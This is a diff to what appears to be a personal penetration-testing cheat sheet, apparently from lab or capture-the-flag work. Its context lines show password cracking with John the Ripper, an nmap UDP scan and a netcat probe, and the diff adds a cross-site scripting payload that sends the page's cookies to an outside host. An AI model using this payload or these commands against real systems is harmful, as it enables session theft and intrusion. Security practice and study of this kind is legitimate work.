@@ -83,6 +83,8 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 NMAP UDP
 sudo nmap -sU 192.168.248.145  
 echo "version" | nc 192.168.238.143 3003
-
-
+____________________________________
+XSS
+____________________________________
+<img src=x onerror=fetch('http://10.10.14.108'+document.cookie);>
 
